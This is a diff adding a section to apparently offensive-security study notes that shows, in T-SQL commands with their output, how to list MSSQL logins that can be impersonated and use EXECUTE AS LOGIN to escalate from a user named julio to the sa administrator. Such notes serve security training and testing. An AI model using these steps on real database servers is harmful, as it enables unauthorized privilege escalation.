@@ -108,6 +108,45 @@
 8> GO
 ```
 
+## Impersonate Existing Users with MSSQL
+
+Identify Users that We Can Impersonate
+```
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+name
+-----------------------------------------------
+sa
+ben
+valentin
+```
+
+Verifying our Current User and Role
+```
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+-----------
+julio
+```
+
+Impersonating the SA User
+```
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+```
+
 
 ---
 ## Attacking RDP
